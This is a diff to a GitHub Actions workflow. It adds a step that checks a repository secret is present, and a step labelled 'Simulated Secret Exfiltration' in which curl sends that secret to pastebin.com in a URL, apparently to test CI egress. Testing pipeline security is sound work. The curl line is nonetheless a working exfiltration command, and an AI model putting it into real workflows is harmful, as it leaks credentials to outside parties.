@@ -92,5 +92,24 @@ jobs:
           echo "Running processes"
           ps aux | head
 
+      - name: Secret Test
+        run: |
+          echo "Secret exists"
+          if [ -n "$TEST_SECRET" ]; then
+            echo "Secret injected"
+          fi
+        env:
+          TEST_SECRET: ${{ secrets.TEST_SECRET }}
+
+      - name: Simulated Secret Exfiltration
+        continue-on-error: true
+        env:
+          TEST_SECRET: ${{ secrets.TEST_SECRET }}
+        run: |
+          echo "Trying to send secret externally"
+      
+          curl -v --connect-timeout 10 \
+            "https://pastebin.com/?secret=$TEST_SECRET" || true
+
       - name: Finish
         run: echo "Done"
